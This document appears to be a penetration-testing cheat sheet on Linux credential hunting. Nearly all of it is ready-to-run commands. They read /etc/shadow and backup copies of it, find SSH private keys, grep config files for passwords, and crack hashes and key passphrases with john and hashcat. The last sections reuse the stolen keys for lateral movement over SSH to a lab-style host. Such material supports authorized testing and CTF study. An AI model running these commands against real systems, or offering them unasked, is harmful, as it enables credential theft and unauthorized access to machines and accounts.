# Linux Credential Hunting

!!! tip "Tip"
    `grep -r "password" /etc /home /var/www 2>/dev/null` catches a surprising number of credentials in config files. Also check `.bash_history`, `.bashrc`, `.profile`, and `/var/log/` for command history with embedded credentials.

---

## `/etc/passwd` and `/etc/shadow`

```bash
cat /etc/passwd
cat /etc/shadow
ls -lah /etc/shadow
```

If `/etc/shadow` is world-readable, extract hashes directly. Check for readable backups:

```bash
find / -name "shadow*" -type f -readable 2>/dev/null
cat /var/backups/shadow.bak
```

Crack hashes offline:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.bak
hashcat -m 1800 shadow.bak /usr/share/wordlists/rockyou.txt
```

---

## SSH Private Keys

```bash
find / -name "id_rsa" -type f 2>/dev/null
find /home -name "*.pem" -o -name "*.ppk" 2>/dev/null
ls -lah ~/.ssh/id_rsa
```

If the key is encrypted, crack the passphrase:

```bash
ssh2john id_rsa > ssh.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
```

Use the decrypted key:

```bash
ssh -i id_rsa <user>@10.10.10.10
```

---

## Passwords in Config Files

```bash
grep -iR --color=always 'password' .
grep -r "password" /etc/
find / -type f \( -name "*.conf" -o -name "*.ini" -o -name "*.json" \) -exec grep -i "password" {} + 2>/dev/null
```

---

## Lateral Movement via SSH Keys

```bash
ssh -i id_rsa <user>@10.10.10.10
```

If SSH agent forwarding is enabled:

```bash
ssh -A <user>@10.10.10.10
ssh <user>@10.10.10.10
```
